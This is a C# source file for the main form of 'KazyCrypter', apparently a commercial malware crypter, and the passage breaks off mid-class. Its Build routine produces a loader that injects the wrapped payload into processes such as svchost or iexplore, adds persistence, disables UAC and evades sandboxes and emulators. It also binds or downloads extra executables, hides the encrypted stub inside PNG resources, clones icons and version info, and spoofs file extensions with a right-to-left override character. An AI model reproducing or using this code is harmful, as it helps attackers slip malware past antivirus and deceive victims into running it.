using System;
using System.Collections.Generic;
using System.Drawing;
using System.Text;
using System.Windows.Forms;
using SkinSoft.OSSkin;
using System.IO;
using System.Diagnostics;
using Microsoft.Win32;
using System.Threading;
using System.Resources;
using System.IO.Compression;
using System.Drawing.Imaging;
using System.Runtime.InteropServices;
using Mono.Cecil;
using System.Net.Mail;
using System.Net;

namespace KazyCrypter
{
    public partial class Main : Form
    {
        OSSkin skin;
        Random r;
        string resloc = Path.GetPathRoot(Environment.SystemDirectory) + "\\res\\";
        Process resproc, upxproc;
        int timeleft;

        public Main()
        {
            r = new Random();
            skin = new OSSkin();
            InitializeComponent();
            toolStripLabel1.Text += LicenseGlobal.Seal.GetVariable("version");

            label2.Text += LicenseGlobal.Seal.Username;
            label5.Text += LicenseGlobal.Seal.UnlimitedTime ? "Unlimited" : LicenseGlobal.Seal.ExpirationDate.ToShortDateString();
            label7.Text += LicenseGlobal.Seal.LicenseType.ToString();
            timeleft = LicenseGlobal.Seal.UnlimitedTime ? 0 : (int)LicenseGlobal.Seal.TimeRemaining.TotalSeconds;
            if (timeleft != 0)
                timer1.Start();
            else
                label6.Text += "Unlimited";

            for (int i = 0; i < LicenseGlobal.Seal.News.Length; i++)
                richTextBox2.AppendText(LicenseGlobal.Seal.News[i].Name + " - " + LicenseGlobal.Seal.News[i].Time.ToShortDateString() + "\n" + LicenseGlobal.Seal.GetPostMessage(LicenseGlobal.Seal.News[i].ID) + "\n\n");

            Text += LicenseGlobal.Seal.Username;
            CheckForIllegalCrossThreadCalls = false;
            Setup();
            InitializeMessage();
            InitializeSkins();
            LoadSettings();
            vScrollBar1_Scroll(null, null);
            comboBox1.SelectedIndex = 0;
            comboBox3.SelectedIndex = 0;
        }

        private byte[] ReadEoF(string fileName)
        {
            byte[] buffer = null;
            using (FileStream fs = new FileStream(fileName, FileMode.Open))
            {
                buffer = new byte[4];
                fs.Position = 0x3C;
                fs.Read(buffer, 0, 4);
                fs.Position = BitConverter.ToInt32(buffer, 0) + 0x6;
                buffer = new byte[2];
                fs.Read(buffer, 0, 2);
                fs.Position += 0x100 + ((BitConverter.ToInt16(buffer, 0) - 1) * 0x28);
                buffer = new byte[8];
                fs.Read(buffer, 0, 8);
                fs.Position = BitConverter.ToInt32(buffer, 0) + BitConverter.ToInt32(buffer, 4);
                buffer = new byte[fs.Length - fs.Position];
                fs.Read(buffer, 0, buffer.Length);
            }
            return buffer;
        }
        
        private void SaveSettings()
        {
            RegistryKey key = Registry.CurrentUser.CreateSubKey("KazyCrypter");
            key.SetValue("Skin", comboBox2.Text);
            key.Close();
        }

        private void LoadSettings()
        {
            RegistryKey key = Registry.CurrentUser.OpenSubKey("KazyCrypter");
            SkinStyle style = SkinStyle.Office2007Black;
            if (key != null)
            {
                try
                {
                    string name = key.GetValue("Skin").ToString();
                    if (name == "None")
                    {
                        skin.Shutdown();
                        comboBox2.SelectedIndex = 0;
                    }
                    else
                    {
                        foreach (SkinStyle s in Enum.GetValues(typeof(SkinStyle)))
                            if (s.ToString() == name)
                                style = s;
                        skin.Shutdown();
                        skin.Style = style;
                        for (int i = 0; i < comboBox2.Items.Count; i++)
                            if (comboBox2.Items[i].ToString() == skin.Style.ToString())
                                comboBox2.SelectedIndex = i;
                    }
                }
                catch { }
                key.Close();
            }
            else
            {
                skin.Shutdown();
                skin.Style = style;
                for (int i = 0; i < comboBox2.Items.Count; i++)
                    if (comboBox2.Items[i].ToString() == skin.Style.ToString())
                        comboBox2.SelectedIndex = i;
            }
        }

        private void InitializeSkins()
        {
            comboBox2.Items.Add("None");
            foreach (SkinStyle s in Enum.GetValues(typeof(SkinStyle)))
                comboBox2.Items.Add(s.ToString());
        }

        private void UpxProc(string filename)
        {
            upxproc.StartInfo.Arguments = @"-9 -f """ + filename + @"""";
            upxproc.Start();
            upxproc.WaitForExit();
        }

        private void ResProc(string arguments)
        {
            resproc.StartInfo.Arguments = arguments;
            resproc.Start();
            resproc.WaitForExit();
        }

        private void Obfuscate(string Path)
        {
            AssemblyDefinition asm = AssemblyDefinition.ReadAssembly(Path);

            ModuleDefinition MainModule = asm.MainModule;
            foreach (TypeDefinition t in MainModule.Types)
            {
                t.Name = RandomString(30, false);
                foreach (PropertyDefinition p in t.Properties)
                {
                    p.Name = RandomString(30, false);
                }

                foreach (FieldDefinition f in t.Fields)
                {
                    f.Name = RandomString(30, false);
                }

                foreach (EventDefinition ed in t.Events)
                {
                    ed.Name = RandomString(30, false);
                }
                if (!t.Namespace.Contains(".My"))
                {   // We cant replace these^
                    foreach (MethodDefinition m in t.Methods)
                    {
                        if (m.IsConstructor == false)
                        {
                            if (m.IsPInvokeImpl == false)
                            {
                                m.Name = " ";
                            }
                        }
                        foreach (ParameterDefinition param in m.Parameters)
                        {
                            param.Name = RandomString(30, false);
                        }
                    }
                    t.Namespace = RandomString(30, false);
                }
            }
            asm.Write(Path);
        }

        private void InitializeMessage()
        {
            btrd1.Tag = MessageBoxButtons.OK;
            btrd2.Tag = MessageBoxButtons.OKCancel;
            btrd3.Tag = MessageBoxButtons.YesNo;
            icpb1.Image = SystemIcons.Information.ToBitmap();
            icpb2.Image = SystemIcons.Question.ToBitmap();
            icpb3.Image = SystemIcons.Error.ToBitmap();
            icrd1.Tag = MessageBoxIcon.Information;
            icrd2.Tag = MessageBoxIcon.Question;
            icrd3.Tag = MessageBoxIcon.Error;
            icrd4.Tag = MessageBoxIcon.None;
        }

        private void Setup()
        {
            try
            {
                if (Directory.Exists(resloc))
                    Directory.Delete(resloc, true);
                Directory.CreateDirectory(resloc);
                File.WriteAllBytes(resloc + "res.exe", Properties.Resources.ResHacker);
                File.WriteAllBytes(resloc + "upx.exe", Properties.Resources.upx);
                upxproc = new Process();
                upxproc.StartInfo.FileName = resloc + "upx.exe";
                upxproc.StartInfo.CreateNoWindow = true;
                upxproc.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
                resproc = new Process();
                resproc.StartInfo.FileName = resloc + "res.exe";
                resproc.StartInfo.CreateNoWindow = true;
                resproc.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message, "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                Environment.Exit(0);
            }   
        }

        private void textBox1_KeyDown(object sender, KeyEventArgs e)
        {
            e.SuppressKeyPress = true;
        }

        private void button1_Click(object sender, EventArgs e)
        {
            if (openFileDialog1.ShowDialog() == System.Windows.Forms.DialogResult.OK)
            {
                mainText.Text = openFileDialog1.FileName;
                File.Copy(openFileDialog1.FileName, resloc + "original.exe", true);
                ResProc("-extract " + resloc + "original.exe, " + resloc + "res.rc, ICONGROUP,,");
                if (File.Exists(resloc + "Icon_1.ico"))
                    pictureBox2.Image = new Icon(resloc + "Icon_1.ico").ToBitmap();
                else
                    pictureBox2.Image = SystemIcons.Application.ToBitmap();
                CleanRes();
            }
        }

        private void CleanRes()
        {
            foreach (FileInfo f in new DirectoryInfo(resloc).GetFiles())
                if (f.Name != "res.exe")
                    f.Delete();
        }

        private void Form1_FormClosed(object sender, FormClosedEventArgs e)
        {
            SaveSettings();
            Directory.Delete(resloc, true);
            Environment.Exit(0);
        }

        private MessageBoxButtons GetMessageButton()
        {
            MessageBoxButtons bt = MessageBoxButtons.OK;
            foreach (Control c in groupBox5.Controls)
                if ((c as RadioButton).Checked)
                    bt = (MessageBoxButtons)(c as RadioButton).Tag;
            return bt;
        }

        private MessageBoxIcon GetMessageIcon()
        {
            MessageBoxIcon icon = MessageBoxIcon.None;
            foreach (Control c in groupBox6.Controls)
                if (c is RadioButton)
                    if ((c as RadioButton).Checked)
                        icon = (MessageBoxIcon)(c as RadioButton).Tag;
            return icon;
        }

        private void button2_Click(object sender, EventArgs e)
        {
            MessageBox.Show(textText.Text, titleText.Text, GetMessageButton(), GetMessageIcon());
        }

        private void button3_Click(object sender, EventArgs e)
        {
            if (openFileDialog2.ShowDialog() == System.Windows.Forms.DialogResult.OK)
            {
                textBox1.Text = openFileDialog2.FileName;
                if (openFileDialog2.FileName.EndsWith(".exe"))
                {
                    File.Copy(openFileDialog2.FileName, resloc + "iconclone.exe", true);
                    ResProc("-extract " + resloc + "iconclone.exe, " + resloc + "res.rc, ICONGROUP,,");
                    if (File.Exists(resloc + "Icon_1.ico"))
                        pictureBox3.Image = new Icon(resloc + "Icon_1.ico").ToBitmap();
                    else
                        pictureBox3.Image = SystemIcons.Application.ToBitmap();
                    CleanRes();
                }
                else
                    pictureBox3.Image = new Icon(openFileDialog2.FileName).ToBitmap();
            }
        }

        private void button4_Click(object sender, EventArgs e)
        {
            if (openFileDialog3.ShowDialog() == System.Windows.Forms.DialogResult.OK)
                textBox3.Text = openFileDialog3.FileName;
        }

        private void checkBox7_CheckedChanged(object sender, EventArgs e)
        {
            groupBox9.Enabled = checkBox7.Checked;
        }

        private void checkBox8_CheckedChanged(object sender, EventArgs e)
        {
            groupBox10.Enabled = checkBox8.Checked;
        }

        private void checkBox1_CheckedChanged(object sender, EventArgs e)
        {
            groupBox3.Enabled = groupBox4.Enabled = groupBox5.Enabled = groupBox6.Enabled = button2.Enabled = checkBox1.Checked;
        }

        private void checkBox9_CheckedChanged(object sender, EventArgs e)
        {
            groupBox14.Enabled = checkBox9.Checked;
        }

        private void checkBox11_CheckedChanged(object sender, EventArgs e)
        {
            groupBox20.Enabled = checkBox11.Checked;
        }

        private void checkBox16_CheckedChanged(object sender, EventArgs e)
        {
            groupBox22.Enabled = checkBox16.Checked;
        }

        private void comboBox2_SelectedIndexChanged(object sender, EventArgs e)
        {
            SkinStyle style = SkinStyle.Office2007Black;
            if (comboBox2.SelectedItem.ToString() == "None")
                skin.Shutdown();
            else
            {
                foreach (SkinStyle s in Enum.GetValues(typeof(SkinStyle)))
                    if (s.ToString() == comboBox2.SelectedItem.ToString())
                        style = s;
                skin.Shutdown();
                skin.Style = style;
            }
        }

        private string RandomString(int Length, bool SpeciaChars)
        {
            string chars = "qwertzuiopasdfghjklyxcvbnmQWERTZUIOPASDFGHJKLYXCVBNM";
            if (SpeciaChars)
                chars += "|Ä€Í÷×äđĐ[]íłŁ$ß¤<>#&@{}<;>*,.-";
            string ret = chars[r.Next(10, chars.Length)].ToString();
            for (int i = 1; i < Length; i++)
                ret += chars[r.Next(chars.Length)];
            return ret;
        }

        private void vScrollBar1_Scroll(object sender, ScrollEventArgs e)
        {
            label4.Text = "Length: " + vScrollBar1.Value;
            txtAFilename.Text = RandomString(vScrollBar1.Value, false);
            txtADescription.Text = RandomString(vScrollBar1.Value, false);
            txtACopyright.Text = RandomString(vScrollBar1.Value, false);
            txtAProduct.Text = RandomString(vScrollBar1.Value, false);
            numVersion_1.Value = r.Next(1, 100);
            numVersion_2.Value = r.Next(0, 100);
            numVersion_3.Value = r.Next(0, 100);
            numVersion_4.Value = r.Next(0, 100);
            numFileVersion_1.Value = r.Next(1, 100);
            numFileVersion_2.Value = r.Next(0, 100);
            numFileVersion_3.Value = r.Next(0, 100);
            numFileVersion_4.Value = r.Next(0, 100);
        }

        private void addFileToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (openFileDialog4.ShowDialog() == System.Windows.Forms.DialogResult.OK)
            {
                ListViewItem item = new ListViewItem();
                item.SubItems[0].Text = openFileDialog4.FileName;
                item.SubItems.Add("AppData");
                item.SubItems.Add("Once");
                listView1.Items.Add(item);
            }
        }

        private void appDataToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (ListViewItem item in listView1.SelectedItems)
                item.SubItems[1].Text = "AppData";
        }

        private void toolStripMenuItem1_Click(object sender, EventArgs e)
        {
            foreach (ListViewItem item in listView1.SelectedItems)
                item.SubItems[1].Text = "Temp";
        }

        private void desktopToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (ListViewItem item in listView1.SelectedItems)
                item.SubItems[1].Text = "Desktop";
        }

        private void windowsToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (ListViewItem item in listView1.SelectedItems)
                item.SubItems[1].Text = "Windows";
        }

        private void system32ToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (ListViewItem item in listView1.SelectedItems)
                item.SubItems[1].Text = "System32";
        }

        private void programFilesToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (ListViewItem item in listView1.SelectedItems)
                item.SubItems[1].Text = "Program Files";
        }

        private void yesToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (ListViewItem item in listView1.SelectedItems)
                item.SubItems[2].Text = "Always";
        }

        private void noToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (ListViewItem item in listView1.SelectedItems)
                item.SubItems[2].Text = "Never";
        }

        private void onceToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (ListViewItem item in listView1.SelectedItems)
                item.SubItems[2].Text = "Once";
        }

        private void removeToolStripMenuItem_Click(object sender, EventArgs e)
        {
            while (listView1.SelectedItems.Count != 0)
                listView1.Items.Remove(listView1.SelectedItems[0]);
        }

        private void removeAllToolStripMenuItem_Click(object sender, EventArgs e)
        {
            listView1.Items.Clear();
        }

        private void oKToolStripMenuItem_Click(object sender, EventArgs e)
        {
            ListViewItem item = new ListViewItem();
            item.SubItems[0].Text = urltext.Text;
            item.SubItems.Add("AppData");
            item.SubItems.Add("Once");
            listView1.Items.Add(item);
        }

        private void Build()
        {
            try
            {
                double originalsize = 0;
                Stopwatch st = new Stopwatch();
                st.Start();
                WriteInfo("Extracting compiler components...");
                File.WriteAllBytes(resloc + "csc.exe", Properties.Resources.csc);
                File.WriteAllBytes(resloc + "cscomp.dll", Properties.Resources.cscomp);
                File.WriteAllBytes(resloc + "cscompui.dll", Properties.Resources.cscompui);
                File.WriteAllBytes(resloc + "mt.exe", Properties.Resources.mt);
                File.WriteAllBytes(resloc + "uac.manifest", Properties.Resources.uac);
                File.WriteAllBytes(resloc + "upx.exe", Properties.Resources.upx);
                WriteInfo("Creating resource manager...");
                ResourceWriter m = new ResourceWriter(resloc + "res.resources");

                string source = Properties.Resources.Stub;
                WriteInfo("Writing startup informations...");
                source = source.Replace("%STARTUP%", checkBox9.Checked ? "true" : "false");
                source = source.Replace("%LOCATION%", comboBox1.Text);
                source = source.Replace("%FILENAME%", textBox7.Text);
                source = source.Replace("%MELT%", checkBox10.Checked ? "true" : "false");
                source = source.Replace("%COMPRESSED%", checkBox4.Checked ? "true" : "false");
                source = source.Replace("%CMD%", textBox4.Text);

                WriteInfo("Writing injection informations...");
                string injectloc = "";
                foreach (Control c in groupBox2.Controls)
                    if (c is RadioButton)
                        if ((c as RadioButton).Checked)
                            switch ((c as RadioButton).Name)
                            {
                                case "radioButton1":
                                    injectloc = "vbc";
                                    break;

                                case "radioButton2":
                                    injectloc = "itself";
                                    break;

                                case "radioButton3":
                                    injectloc = "iexplore";
                                    break;

                                case "radioButton4":
                                    injectloc = "svchost";
                                    break;

                                case "radioButton5":
                                    injectloc = textBox2.Text;
                                    break;
                            }
                source = source.Replace("%INJECT%", injectloc);
                source = source.Replace("%SLEEP%", checkBox11.Checked ? "true" : "false");
                source = source.Replace("%SLEEPTIME%", (numericUpDown1.Value * 1000).ToString());

                WriteInfo("Writing anti informations...");
                source = source.Replace("%ANTISANDBOXIE%", checkBox14.Checked ? "true" : "false");
                source = source.Replace("%ANTIWS%", checkBox12.Checked ? "true" : "false");
                source = source.Replace("%ANTIWPE%", checkBox13.Checked ? "true" : "false");
                source = source.Replace("%ANTIEMULATION%", checkBox15.Checked ? "true" : "false");

                WriteInfo("Writing message informations...");
                source = source.Replace("%MESSAGE%", checkBox1.Checked ? "true" : "false");
                source = source.Replace("%MESSAGEONFIRST%", checkBox23.Checked ? "true" : "false");
                source = source.Replace("%MESSAGEBUTTON%", GetMessageButton().ToString());
                source = source.Replace("%MESSAGEICON%", GetMessageIcon().ToString());
                source = source.Replace("%MESSAGETEXT%", textText.Text);
                source = source.Replace("%MESSAGETITLE%", titleText.Text);

                WriteInfo("Writing binder and downloader informations...");
                string bindnames, bindloc, bindrun, downnames, downloc, downrun, prockill;
                bindnames = bindloc = bindrun = downnames = downloc = downrun = prockill = "";
                int bindi = 0;
                foreach (ListViewItem i in listView1.Items)
                    if (i.SubItems[0].Text.StartsWith("http"))
                    {
                        downnames += @"""" + i.SubItems[0].Text + @""",";
                        downloc += @"""" + i.SubItems[1].Text + @""",";
                        downrun += (i.SubItems[2].Text == "Once" ? "false" : (i.SubItems[2].Text == "Always" ? "true" : "null")) + ",";
                    }
                    else
                    {
                        FileStream bst = File.OpenRead(i.SubItems[0].Text);
                        originalsize += bst.Length;
                        bst.Close();
                        if (checkBox24.Checked)
                            UpxProc(i.SubItems[0].Text);
                        m.AddResource("BIND" + bindi.ToString(), checkBox4.Checked ? Compress(File.ReadAllBytes(i.SubItems[0].Text)) : File.ReadAllBytes(i.SubItems[0].Text));
                        bindi++;
                        bindnames += @"""" + i.SubItems[0].Text.Split('\\')[i.SubItems[0].Text.Split('\\').Length - 1] + @""",";
                        bindloc += @"""" + i.SubItems[1].Text + @""",";
                        bindrun += (i.SubItems[2].Text == "Once" ? "false" : (i.SubItems[2].Text == "Always" ? "true" : "null")) + ",";
                    }
                foreach (ListViewItem i in listView2.Items)
                    prockill += i.SubItems[0].Text + "|";
                prockill = StringTrim(prockill);
                bindnames = StringTrim(bindnames);
                bindloc = StringTrim(bindloc);
                bindrun = StringTrim(bindrun);
                downnames = StringTrim(downnames);
                downloc = StringTrim(downloc);
                downrun = StringTrim(downrun);
                source = source.Replace("%BINDNAMES%", bindnames);
                source = source.Replace("%BINDLOCATIONS%", bindloc);
                source = source.Replace("%BINDRUN%", bindrun);
                source = source.Replace("%DOWNNAMES%", downnames);
                source = source.Replace("%DOWNLOCATIONS%", downloc);
                source = source.Replace("%DOWNRUN%", downrun);
                source = source.Replace("%PROCKILL%", prockill);

                WriteInfo("Writing protection options...");
                source = source.Replace("%HIDEFILE%", checkBox20.Checked ? "true" : "false");
                source = source.Replace("%REGPERS%", checkBox26.Checked ? "true" : "false");
                source = source.Replace("%PROCPERS%", checkBox22.Checked ? "true" : "false");
                source = source.Replace("%CRITICAL%", checkBox21.Checked ? "true" : "false");
                source = source.Replace("%DISABLEUAC%", checkBox5.Checked ? "true" : "false");
                source = source.Replace("%ELEVATED%", checkBox17.Checked ? "true" : "false");

                WriteInfo("Writing main file...");
                FileStream mfst = File.OpenRead(mainText.Text);
                originalsize += mfst.Length;
                mfst.Close();
                if (checkBox24.Checked)
                    UpxProc(mainText.Text);
                m.AddResource("MAIN", checkBox4.Checked ? Compress(File.ReadAllBytes(mainText.Text)) : File.ReadAllBytes(mainText.Text));
                WriteInfo("Generating resources...");
                m.Generate();
                m.Close();
                WriteInfo("Writing source file...");
                File.WriteAllText(resloc + "stub.cs", source);
                Process cp = new Process();
                cp.StartInfo.FileName = resloc + "csc.exe";
                cp.StartInfo.Arguments = "/t:winexe /res:" + resloc + "res.resources /platform:x86 /o /noconfig /r:System.dll /r:System.Windows.Forms.dll /out:" + resloc + "stub.exe " + resloc + "stub.cs";
                cp.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
                WriteInfo("Compiling main stub...");
                cp.Start();
                cp.WaitForExit();
                WriteInfo("Deleting versioninfo from main stub...");
                ResProc("-delete " + resloc + "stub.exe, " + resloc + "stub.exe , VERSIONINFO, ,");
                WriteInfo("MAIN STUB DONE!\n");

                source = Properties.Resources.Loader;
                WriteInfo("Randomizing variables...");
                string nameloc = RandomString(r.Next(1, 20), false);
                string key = RandomString(r.Next(1, 20), false);
                string resname = RandomString(r.Next(1, 20), false);

                WriteInfo("Reading stub file...");
                byte[] stub = File.ReadAllBytes(resloc + "stub.exe");
                WriteInfo("Encrypting stub...");
                stub = Encrypt(stub, key);
                WriteInfo("Generating bitmap...");
                Bitmap bmp = GetImageFromBytes(stub);

                WriteInfo("Writing bytes...");
                MemoryStream mst = new MemoryStream();
                bmp.Save(mst, ImageFormat.Png);
                byte[] bytes = mst.ToArray();
                mst.Close();

                WriteInfo("Generating resources...");
                List<byte[]> splitted = SplitBytes(bytes, 1000, 2000);
                m = new ResourceWriter(resloc + resname + ".resources");
                List<string> fnames = new List<string>();
                for (int i = 0; i < splitted.Count; i++)
                    fnames.Add(RandomString(r.Next(10, 20), false));
                for (int i = 0; i < splitted.Count; i++)
                    m.AddResource(fnames[i], splitted[i]);
                string fns = "";
                foreach (string s in fnames)
                    fns += s + "|";
                fns = StringTrim(fns);

                string loaderbytes = "";
                foreach (byte b in Encrypt(Properties.Resources.KazyLoader, key))
                    loaderbytes += b.ToString() + ",";
                loaderbytes = StringTrim(loaderbytes);

                m.AddResource(nameloc, fnames.ToArray());
                m.Generate();
                m.Close();
                WriteInfo("Writing loader info...");
                if (!checkBox19.Checked)
                    source = source.Replace("%ASSEMBLYINFO%", @"[assembly: AssemblyDescription(""%TITLE%"")]
[assembly: AssemblyTitle(""%DESCRIPTION%"")]
[assembly: AssemblyCopyright(""%COPYRIGHT%"")]
[assembly: AssemblyProduct(""%PRODUCT%"")]
[assembly: AssemblyVersion(""%VERSION%"")]
[assembly: AssemblyFileVersion(""%FILEVERSION%"")]");
                else
                    source = source.Replace("%ASSEMBLYINFO%", "");
                source = source.Replace("%KEY%", key);
                source = source.Replace("%NAMELOC%", nameloc);
                source = source.Replace("%LOADERBYTES%", loaderbytes);
                source = source.Replace("%RESNAME%", resname);
                source = source.Replace("%DESCRIPTION%", txtADescription.Text);
                source = source.Replace("%TITLE%", txtAFilename.Text);
                source = source.Replace("%PRODUCT%", txtAProduct.Text);
                source = source.Replace("%COPYRIGHT%", txtACopyright.Text);
                source = source.Replace("%VERSION%", numVersion_1.Value + "." + numVersion_2.Value + "." + numVersion_3.Value + "." + numVersion_4.Value);
                source = source.Replace("%FILEVERSION%", numFileVersion_1.Value + "." + numFileVersion_2.Value + "." + numFileVersion_3.Value + "." + numFileVersion_4.Value);
                File.WriteAllText(resloc + "loader.cs", source);

                string savename = saveFileDialog1.FileName.Split('\\')[saveFileDialog1.FileName.Split('\\').Length - 1];
                WriteInfo("Generating loader...");
                bool icon = false;
                if (checkBox7.Checked)
                {
                    if (textBox1.Text.EndsWith(".exe"))
                    {
                        File.Copy(textBox1.Text, resloc + "icon.exe", true);
                        ResProc("-extract " + resloc + "icon.exe, " + resloc + "icon.rc, ICONGROUP,,");
                    }
                    else
                        File.Copy(textBox1.Text, resloc + "Icon_1.ico");
                    if (File.Exists(resloc + "Icon_1.ico"))
                        icon = true;
                }
                cp.StartInfo.Arguments = "/t:winexe /platform:x86 /o " + (icon ? "/win32icon:" + resloc + "Icon_1.ico " : " ") + "/noconfig /res:" + resloc + resname + ".resources /r:System.dll /out:" + resloc + savename + " " + resloc + "loader.cs";
                cp.Start();
                cp.WaitForExit();
                WriteInfo("FileInfo changes...");
                if (checkBox6.Checked || checkBox8.Checked)
                    ResProc("-delete " + resloc + savename + ", " + resloc + savename + ", VERSIONINFO,,");
                if (checkBox8.Checked)
                {
                    File.Copy(textBox3.Text, resloc + "clone.exe", true);
                    ResProc("-extract " + resloc + "clone.exe, " + resloc + "clone.res, VERSIONINFO,,");
                    ResProc("-add " + resloc + savename + ", " + resloc + savename + ", " + resloc + "clone.res, VERSIONINFO,,");
                }
                if (checkBox3.Checked)
                    Obfuscate(resloc + savename);
                if (checkBox2.Checked)
                {
                    cp.StartInfo.FileName = resloc + "mt.exe";
                    cp.StartInfo.Arguments = "-manifest " + resloc + "uac.manifest -outputresource:" + resloc + savename;
                    cp.Start();
                    cp.WaitForExit();
                }
                if (checkBox16.Checked)
                {
                    int size = (int)numericUpDown2.Value * 1024 * 1024;
                    FileStream fpst = new FileStream(resloc + savename, FileMode.Open);
                    fpst.Position = fpst.Length;
                    for (int i = 0; i < size; i++)
                        fpst.WriteByte(0);
                    fpst.Close();
                }
                byte[] eof = ReadEoF(openFileDialog1.FileName);
                if (eof.Length != 0)
                    File.AppendAllText(resloc + savename, Encoding.ASCII.GetString(eof));
                File.Copy(resloc + savename, saveFileDialog1.FileName, true);
                if (checkBox18.Checked)
                    SpoofExt(saveFileDialog1.FileName, textBox5.Text);
                WriteInfo("LOADER DONE!");

                st.Stop();
                WriteInfo("\nOperation took: " + st.ElapsedMilliseconds.ToString() + " ms");
                WriteInfo("Original file size: " + Math.Floor(originalsize / 1024).ToString() + "KBs");
                mfst = File.OpenRead(resloc + savename);
                WriteInfo("Crypted file size: " + Math.Floor((double)mfst.Length / 1024).ToString() + " KBs");
                string perc = (mfst.Length / originalsize * 100).ToString();
                if (perc.IndexOf(",") != -1)
                    perc = perc.Remove(perc.IndexOf(",") + 2);
                WriteInfo("It's " + perc + "% of the original");
                mfst.Close();
                if (checkBox25.Checked)
                    Process.Start("explorer.exe", saveFileDialog1.FileName.Remove(saveFileDialog1.FileName.LastIndexOf("\\")));
                progressBar1.Value = 0;
                CleanRes();
            }
            catch (Exception ex)
            {
                progressBar1.Value = 0;
                MessageBox.Show(ex.Message, "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
        }

        private List<byte[]> SplitBytes(byte[] b, int min, int max)
        {
            List<byte[]> ret = new List<byte[]>();
            byte[] buf;
            int length = b.Length;
            while (length != 0)
            {
                int curl = r.Next(min, max + 1);
                if (curl > length)
                    curl = length;
                buf = new byte[curl];
                Array.Copy(b, b.Length - length, buf, 0, curl);
                ret.Add(buf);
                length -= curl;
            }
            return ret;
        }

        private void SpoofExt(string filename, string newext)
        {
            string fname = filename.Substring(filename.LastIndexOf("\\"));
            string oname = fname.Remove(fname.IndexOf("."));
            string ext = fname.Substring(fname.IndexOf("."));
            char[] newextchars = newext.ToCharArray();
            Array.Reverse(newextchars);
            newext = "";
            foreach(char c in newextchars)
                newext += c.ToString();
            File.Move(filename, filename.Remove(filename.LastIndexOf("\\")) + oname + '\u202E' + newext + ext);
        }

        private string QWER(string s, string key)
        {
            return Encoding.Unicode.GetString(Encrypt(Encoding.Unicode.GetBytes(s), key));
        }

        private Bitmap GetImageFromBytes(byte[] data)
        {
            Random r = new Random();
            int size = (int)Math.Ceiling(Math.Sqrt(data.Length / 3));
            Bitmap bmp = new Bitmap(size, size, System.Drawing.Imaging.PixelFormat.Format32bppArgb);
            Rectangle rec = new Rectangle(0, 0, size, size);
            BitmapData bdata = bmp.LockBits(rec, ImageLockMode.ReadWrite, bmp.PixelFormat);
            byte[] pdata = new byte[size * size * 4];
            int ind = 0;
            for (int y = 0; y < size; y++)
                for (int x = 0; x < size; x++)
                {
                    int i = ((y * size) + x) * 4;
                    switch (data.Length - ind)
                    {
                        case 0:
                            pdata[i + 3] = 252;
                            pdata[i + 2] = (byte)r.Next(256);
                            pdata[i + 1] = (byte)r.Next(256);
                            pdata[i] = (byte)r.Next(256);
                            break;

                        case 1:
                            pdata[i + 3] = 253;
                            pdata[i + 2] = data[ind++];
                            pdata[i + 1] = (byte)r.Next(256);
                            pdata[i] = (byte)r.Next(256);
                            break;

                        case 2:
                            pdata[i + 3] = 254;
                            pdata[i + 2] = data[ind++];
                            pdata[i + 1] = data[ind++];
                            pdata[i] = (byte)r.Next(256);
                            break;

                        default:
                            pdata[i + 3] = 255;
                            pdata[i + 2] = data[ind++];
                            pdata[i + 1] = data[ind++];
                            pdata[i] = data[ind++];
                            break;
                    }
                }
            Marshal.Copy(pdata, 0, bdata.Scan0, pdata.Length);
            bmp.UnlockBits(bdata);
            return bmp;
        }

        private byte[] Encrypt(byte[] data, string pass)
        {
            byte[] key = Encoding.Unicode.GetBytes(pass);
            int kind = 0;
            for (int i = 0; i < data.Length; i++)
            {
                data[i] = (byte)(data[i] ^ key[kind++]);
                if (kind == key.Length)
                    kind = 0;
            }
            return data;
        }

        private void Progress()
        {
            progressBar1.Value += 1;
            
        }

        private void WriteInfo(string s)
        {
            richTextBox1.AppendText((richTextBox1.Text.Length != 0 ? Environment.NewLine : "") + s);
            richTextBox1.Select(richTextBox1.Text.Length - s.Length, s.Length);
            richTextBox1.SelectionColor = Color.Green;
            richTextBox1.Select(richTextBox1.Text.Length - 1, 1);
            richTextBox1.ScrollToCaret();
            Progress();
        }

        private byte[] Compress(byte[] data)
        {
            using (MemoryStream st = new MemoryStream())
            {
                using (GZipStream g = new GZipStream(st, CompressionMode.Compress))
                {
                    g.Write(data, 0, data.Length);
                    g.Close();
                    return st.ToArray();
                }
            }
        }

        private string StringTrim(string s)
        {
            if (string.IsNullOrEmpty(s))
                return s;
            return s.Remove(s.Length - 1);
        }

        private void button5_Click(object sender, EventArgs e)
        {
            if (saveFileDialog1.ShowDialog() == System.Windows.Forms.DialogResult.OK)
                new Thread(Build).Start();
        }

        private void timer1_Tick(object sender, EventArgs e)
        {
            label6.Text = "Time left: " + IntToTime(timeleft);
            timeleft--;
            if (timeleft == 0)
            {
                MessageBox.Show("Your license has expired!", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                Form1_FormClosed(null, null);
            }
        }

        private string IntToTime(int time)
        {
            string ret = "";
            ret += (time / (60 * 60 * 24)) + " d ";
            time = time % (60 * 60 * 24);
            ret += (time / (60 * 60)) + " h ";
            time = time % (60 * 60);
            ret += (time / 60) + " m ";
            time = time % 60;
            ret += time + " s";
            return ret;
        }

        private void oKToolStripMenuItem1_Click(object sender, EventArgs e)
        {
            listView2.Items.Add(processnameToolStripMenuItem.Text);
        }

        private void removeToolStripMenuItem1_Click(object sender, EventArgs e)
        {
            while (listView2.SelectedItems.Count != 0)
                listView2.Items.Remove(listView2.SelectedItems[0]);
        }

        private void removeAllToolStripMenuItem1_Click(object sender, EventArgs e)
        {
            listView2.Items.Clear();
        }

        private void checkBox18_CheckedChanged(object sender, EventArgs e)
        {
            groupBox29.Enabled = checkBox18.Checked;
        }

